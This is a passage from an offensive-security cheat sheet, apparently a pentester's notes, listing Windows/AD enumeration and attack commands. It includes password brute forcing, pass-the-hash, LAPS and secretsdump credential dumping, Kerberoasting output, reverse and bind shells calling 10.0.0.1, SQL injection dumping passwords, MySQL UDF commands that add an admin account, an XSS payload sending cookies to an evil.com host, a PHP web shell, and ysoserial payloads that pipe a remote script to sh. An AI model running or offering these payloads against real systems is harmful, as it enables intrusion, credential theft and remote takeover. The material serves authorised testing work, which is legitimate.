rpcclient -U <username> <WinIPaddr>
rpcclient $> srvinfo
rpcclient $> enum
rpcclient $> enumdomusers
rpcclient $> queryuser 500
```

Password bruteforce via rpcclient
```
for u in `cat users_sorted.txt`; do
echo -n "[*] user: $u" && \
proxychains rpcclient -U "domain\$u%$u" -c "getusername;quit" 10.9.8.40
done
```

Pass the Hash Variant
```
pth-rpcclient -U "domain\name%hash" --pw-nt-hash 10.4.128.41
```

## enum4linux

Domain Controller Anonymous Enumeration
```
enum4linux -A <ip> | tee <ip>-anon-enum.txt
```

## iptables

*Append rules to top of the Input filter and make persistent*
```
/sbin/iptables -I INPUT -p tcp --dport 50050 -s <ip address> -j ACCEPT
/sbin/iptables -I INPUT -p tcp --dport 22 -s <ip address> -j ACCEPT
service netfilter-persistent save
iptables -L -v
```

*Delete rule*
```
iptables -D INPUT -i eth0 -p tcp --dport 443 -j ACCEPT
```

## ldapsearch

Obtain LAPS passwords for domain computers using the linux based ldapsearch tool

[Dump Laps Passwords with LDAPSearch by Rob Fuller](https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/)
```
ldapsearch -x -h 192.168.80.10 -D "helpdesk" -w ASDqwe123 -b "dc=sittingduck,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

-x - Use basic authentication
-h 192.168.80.10 - Connect to the Domain Controller for ldap
-D "helpdesk" -w ASDqwe123 - Login as the helpdesk user, with the password ASDqwe123
-b "dc=sittingduck,dc=info" - This loads the base LDAP object of the entire domain.
"(ms-MCS-AdmPwd=*)" - Filter out any objects that I can’t see a value for ms-MCS-AdmPwd for. (If you have rights as that user to see even one Administrator password, this will show it.)
ms-MCS-AdmPwd - Only show me the ms-MCS-AdmPwd object (which by default includes the object name and DN so you will still know what host it belongs to)
```

## NFS

List NFS Mounts on remote host
```
showmount -e <ipaddr>
```

Check NFS share counts in a loop
```
#cat nfs.results.msf |grep -|cut -d'-' -f2|cut -d' ' -f2,5|sed 's/ /:/g'

for server in $(cat nfs.shares); do
echo "[*] Checking $server"
mount -o nolock,nfsvers=3 $server /mnt/n4s_backup
ls /mnt/n4s_backup
umount /mnt/n4s_backup
done
```

## Shells

### TTY Shells

http://pentestmonkey.net/blog/post-exploitation-without-a-tty

Upgrade your shell to a full TTY
```
python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/sh -i

perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')
```

(From within IRB)
```
exec "/bin/sh"
```

(From within vi)
```
:!bash
```

(From within vi)
```
:set shell=/bin/bash:shell
```

(From within nmap)
```
!sh
```

### Bind Shells

https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py

Perl Bind Shell (Port 1000)
```
perl -e 'use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/usr/bin/bash -i");};'
```

### Reverse Shells

Bash
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

PERL

Here’s a shorter, feature-free version of the perl-reverse-shell:
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python
This was tested under Linux / Python 2.7:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

PHP

This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
```
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

xterm

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
```
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
```
Xnest :1
```

your’ll need to authorise the target to connect to you (command also run on your host):
```
xhost +targetip
```

## SSH Tunnels

Send data over ssh to port 9000 on target

```ssh -L 8090:localhost:9000 james@123.123.123```

Send data over ssh to port 80 on target through jumphost

```ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123.321 -t ssh -L 8800:localhost:80 james@124.123.122```

Start ssh using existing connections
```
nano ~/.ssh/config
ControlMaster auto
ControlPath ~/.ssh/control:%h:%p:%r
```

## Impacket

Source: https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15

### Install impacket on Windows
```
git clone https://github.com/CoreSecurity/impacket.git
```

Download VC++ For Python 2.7 (Needed to compile some modules)

- https://www.microsoft.com/en-us/download/details.aspx?id=44266

Install necessary modules (You may need to install pip first)

```python -m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump```

You can also download the PyCrypto binary if it fails to compile

- http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe

### Secretsdump

Attempt to dump credentials from a remote machine via Pass the Hash
```
python secretsdump.py ./localadmin@computername.domain.com -hashes aad3b435b51404eeaad3b435b51404ee:21306681c738c3ed2d615e29be1574a3
```

Dump domain password hashes remotely via Volume Shadow Copy
```
c:\users\username\appdata\local\temp\sd.exe domain/username:password@dchostname -just-dc -use-vss -outputfile
```

### GetUserSPNS.py

This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat
Source: https://room362.com/post/2016/kerberoast-pt2/
```
root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin -dc-ip <target DC ip address>
Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

Password:
ServicePrincipalName Name MemberOf PasswordLastSet
---------------------------------- ---------- ---------------------------------------------------- -------------------
http/win10.sittingduck.info uberuser CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info 2015-11-10 23:47:21
MSSQLSvc/WIN2K8R2.sittingduck.info sqladmin01 2016-05-13 19:13:20

$krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
```

### SMBRelayx.py

https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&utm_source=Twitter&utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&utm_campaign=SANS+Pen+Test

## Brute Force Techniques

RDP Brute
```
ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
```

SSH Brute
```
medusa -M ssh -C /usr/share/wordlists/ssh.lst -H 22.txt -T 10| grep SUCCESS |tee medusa-results.txt
```

Telnet Brute
```
medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt
```

# Web Exploitation
## SQL

### SQLi Examples
```
secret' or 1=1 limit1;#
#Find number of columns return by the Select statement
?id=738 order by 1,2,3,4...n until error is received

#Use union select statement to append query to the original
#union Select statement must have same number of columns as original Select statement
?id=738 union select 1,2,3,4,5,6

#Get DB Version
?id=738 union select 1,2,3,4,@@version,6

#Get DBUser
?id=738 union select 1,2,3,4,user(),6

#Get tables from all databases
?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

#Get Table Columns
?id=738 union select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

#Get User passwords
?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
```

#### SQL Joins
```
#FULL All
SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A.KEY = B.KEY

#A partial B
SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key

#B Partial A
SELECT something FROM tableA A RIGHT JOIN tableB B on A.Key = B.Key

#A no B
SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key WHERE B.Key IS NULL

# Outer
SELECT something FROM tableA A FULL OUTER JOIN tableB B on A.Key = B.Key WHERE A.Key IS NULL OR B.Key IS NULL

# Inner
SELECT something FROM tableA A FULL INNER JOIN tableB B on A.Key = B.Key

```

### MySQL
```
[mysqldir]/bin/mysql-h hostname-u root --password=pass <database>

select @@version
select @@servername

mysql> show databases;
mysql> use [db name];
mysql> show tables;
mysql> describe [table name];
mysql> SELECT * FROM [table name];
```

#### UDF Install for Command Execution

User Defined Functions by Platform
```
udf/mysql/linux/32/lib_mysqludf_sys.so
udf/mysql/linux/64/lib_mysqludf_sys.so
udf/mysql/windows/32/lib_mysqludf_sys.dll
udf/mysql/windows/64/lib_mysqludf_sys.dll
```
Source: http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/

Load MYSQLUDF for Linux
```
use test;
create table udf(line blob);
insert into udfvalues(load_file('/tmp/udf/udf.so'));
select * from udfinto dumpfile'/usr/lib/udf.so';
create function sys_exec returns integer soname'udf.so';
select sys_exec('id > /tmp/out; chownapache.apache /tmp/out');
select sys_exec('ls -alh/root/Desktop/ >> /tmp/out');
select sys_exec('ls /etc/sudoers>> /tmp/out');
```

Upload suid.c program
```
wget http://ip:port/privex/mysql/suid-o /tmp/suid
chownroot:root /tmp/suid
chmod4777 /tmp/suid
```

Load MYSQLUDFfor Windows
```
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://xampplite//webdav//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npnINTO DUMPFILE'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user hacker hacker1234!@#$ /add");
SELECT sys_exec("net localgroupAdministrators hacker /add");
s_exec('net localgroup"Remote Desktop Users" hacker /add');
```

### SQLMap

Automated website crawl and test of SQLi
```
python sqlmap.py -u http://example.com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3
```

## XSS

Grab cookie
```
document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />')
```

XSS via image tag
```
<img src="x" onerror="alert('Suck it, Trebek!')" />
```

## Server-side Javascript Injection via Node or ElementJS

File system directory listing
```
res.end(require('fs').readdirSync('.').toString())
```

File read
```
res.end(require('fs').readFileSync('/etc/passwd').toString())
```

## Cold Fusion

Sources:
[JMPESPJUMP - Attacking Adobe Cold Fusion](https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html)

*Decrypt CFM Files back to source*

- https://github.com/disccomp/cfdecrypt

*CF RDS Logon Bypass (Create this html file locally and submit to obtain a auth session)*
```
<form action="http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login" method="post">
<input name="adminpassword" type="hidden" value="" />
<input name="rdsPasswordAllowed" type="hidden" value="1" />
<input type="submit" />
</form>
```
*For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:*

- [ColdFusion_Install_Dir]\lib\neo-query.xml

*For ColdFusion 8, 9 and 10:*

- [ColdFusion_Install_Dir]\lib\neo-datasource.xml

## Java

### JBOSS

Default credential is "admin:admin"
```
0. Host your .jar/.war payload with webshell on local webserver

1. Navigate to the JMX Console on the target host (http://IP.Ad.dr.ess:port/jmx-console/) and search for “service=MainDeployer”.

2. From here you’ll want to utilize the deploy() function since it allows you to enter a URL as a parameter value in java.net.URL. In this field, enter your attack IP and the name of the WAR file in the URL box and then click the “Invoke” button.
```

Other ways to gain execution
```
* jboss.deployment
* jboss.system (MainDeployer)
* http://localhost:8080/invoker/JMXInvokerServlet
* Java Deserialization Vuln via JMXInvokerServlet
* https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now
* https://github.com/frohoff/ysoserial
* https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
* https://www.cigital.com/blog/mitigate-java-deserialization-vulnerability-jboss/
```

Auto-check and exploitation tool (https://github.com/joaomatosf/jexboss)
```
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -h
python jexboss.py -host http://target_host:8080
```

## Java Deserialization

[Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)

[How to get a full shell through Java Runtime.exec](http://codewhitesec.blogspot.de/2015/03/sh-or-getting-shell-environment-from.html)

Ysoserial payload to execute full commands
```
sh -c $@|sh . <payload here>
```

Generate a ysoserial payload to tell server to download further commands via curl and pipe to shell
```
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'sh -c $@|sh . curl http://10.42.65.40/commands.sh |sh' > jenkins_curl_shell.bin
```

Generate a ysoserial payload to execute nc bind shell
```
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'sh -c $@|sh . nc -lp 8088 -e /bin/bash' > nc-jenkins.out
```

### JMXInvokerServlet
```
./ysoserial-master-v0.0.4-gad26e2b-61.jar CommonsCollections5 "touch /tmp/pwned" >payload.txt
```

Generate payload with yososerial and send with Burp. You will get a jboss.invocation.InvocationException response on success or failure.

Ensure the headers match these:
```
POST /invoker/JMXInvokerServlet HTTP/1.1
Host: <hostname/IP>:8080
Content-Type:application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue
Content-Length: 2083
```

### PHP

LFI Read File (without executing)
```
www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
```

LFI Read PHP session file for current sessionid
```
http://blog.target.org/blog.php?page=/var/lib/php5/sess_th3cr1i5cm6m3dq98pb2sn9qg5
```

Create PHP backdoor/shell (windows):
```
echo ^<?php echo passthru($_GET['cmd']); ?^> > C:\inetpub\wwwroot\s.php
```

PHP Command Execution Example
```
Url/page.php?page=system&help=cmd
```@extract ($_REQUEST);
@die ($page($help));
```

#### PHP Type Juggling

Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison.

Add [] after a POST parameter "?user_id[]=user22" to force a NULL (zero-like) condition when comparing a string and an array

### Web Sockets

There are still relatively few dec ent Web Socket testing tools and most aren't very mature:

* BurpSuite - Limited options to view web socket communication, but no ability to edit or replay traffic
* ZAP Proxy - Ability to modify, replay, and fuzz web sockets, but still relatively clumsy
* [WSSiP](https://github.com/nccgroup/wssip)- WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.

# Misc

Things that don't seem to fit elsewhere!

### Canary Tokens

Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser.

To obtain a token:
```
1. Visit http://canarytokens.org.
2. Enter your email address. (It's only used to notify you when the token is triggered, mails are not used for any other purpose.)
3. Enter a comment which describes where you're using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. "file watch on 192.168.100.2:/repos/repo3/README.txt" or "Password lure email in user@domain.com inbox". We envisage having loads of tokens, so a good description is necessary.
4. Click "Generate Token" to obtain your token.
5. Copy the token and drop it somewhere it will be stumbled over.
```
[Canarytokens.org](https://canarytokens.org/generate#)

### Python SSL Web Server

Create PEM file
```
openssl req -newkey rsa:2048 -x509 -keyout cakey.pem -out cacert.pem -days 3650
```

To concatenate the private key and public certificate into a pem file (which is required for many web-servers ) :
```
cat cakey.pem cacert.pem > server.pem
```

Python code
```
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

### McAfee SiteList.xml decryption
Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts
```
type "C:\ProgramData\McAfee\Common Framework\SiteList.xml" |findstr Password

╰ $ ./mcafee_sitelist_pwd_decrypt.py f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password : f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password :
```

https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1

```
git clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption
```

### TightVNC Password Retrieval

Retrieve TightVNC registry keys
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\server
```

Copy password from reg query output
```
Password REG_BINARY 7228098734BBBA06
ControlPassword REG_BINARY 435D7A037B9FDC2B
```

Download vncpwd.exe or other VNC password decoder
```
wine vncpwd.exe 7228098734BBBA06
```

### Password Lists

https://github.com/danielmiessler/SecLists.gits

### AIX Passwords

/etc/security/passwd

Convert AIX passwd file to john format
```
cat $1|egrep ":|password" | sed 's/password = //g' | tr -d "\t " |sed ':a;N;$!ba;s/:\n/:/g'
```
### Decompiling .NET Binaries

http://ilspy.net/

### Magic Hashes

Source: https://www.whitehatsec.com/blog/magic-hashes/

Use Case 1: Use the “Magic” Number below as a password or as a string that you expect to be hashed. When it is compared against the hash of the actual value, and if they both are treated as “0” and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example.

- https://example.com/login.php?user=bob&pass=240610708

Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as “0” and therefore compare to be true. This could be caused to happen

* https://example.com/login.php?user=bob&token=0e462097431906509019562988736854

Hashes
```
HashType HashLength “Magic”Number Magic Hash Found By
md2 32 505144726 0e015339760548602306096794382326 WhiteHat Security, Inc.
md4 32 48291204 0e266546927425668450445617970135 WhiteHat Security, Inc.
md5 32 240610708 0e462097431906509019562988736854 Michal Spacek
sha1 40 10932435112 0e07766915004133176347055865026311692244 Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham
sha224 56
sha256 64
sha384 96
sha512 128
ripemd128 32 315655854 0e251331818775808475952406672980 WhiteHat Security, Inc.
ripemd160 40 20583002034 00e1839085851394356611454660337505469745 Michael A Cleverly
ripemd256 64
ripemd320 80
whirlpool 128
tiger128,3 32 265022640 0e908730200858058999593322639865 WhiteHat Security, Inc.
tiger160,3 40 13181623570 00e4706040169225543861400227305532507173 Michele Spagnuolo
tiger192,3 48
tiger128,4 32 479763000 00e05651056780370631793326323796 WhiteHat Security, Inc.
tiger160,4 40 62241955574 0e69173478833895223726165786906905141502 Michele Spagnuolo
tiger192,4 48
snefru 64
snefru256 64
gost 64
adler32 8 FR 00e00099 WhiteHat Security, Inc.
crc32 8 2332 0e684322 WhiteHat Security, Inc.
crc32b 8 6586 0e817678 WhiteHat Security, Inc.
fnv132 8 2186 0e591528 WhiteHat Security, Inc.
fnv164 16 8338000 0e73845709713699 WhiteHat Security, Inc.
joaat 8 8409 0e074025 WhiteHat Security, Inc.
haval128,3 32 809793630 00e38549671092424173928143648452 WhiteHat Security, Inc.
haval160,3 40 18159983163 0e01697014920826425936632356870426876167 Independently found by Michael Cleverly & Michele Spagnuolo
haval192,3 48 48892056947 0e4868841162506296635201967091461310754872302741 Michael A. Cleverly
haval224,3 56
haval256,3 64
haval128,4 32 71437579 0e316321729023182394301371028665 WhiteHat Security, Inc.
haval160,4 40 12368878794 0e34042599806027333661050958199580964722 Michele Spagnuolo
haval192,4 48
haval224,4 56
haval256,4 64
haval128,5 32 115528287 0e495317064156922585933029613272 WhiteHat Security, Inc.
haval160,5 40 33902688231 00e2521569708250889666329543741175098562 Michele Spagnuolo
haval192,5 48 52888640556 0e9108479697641294204710754930487725109982883677 Michele Spagnuolo
haval224,5 56
haval256,5 64
```

Also check out [HostEnum](https://github.com/threatexpress/red-team-scripts), a self contained powershell enueration script that automates lots of the above.
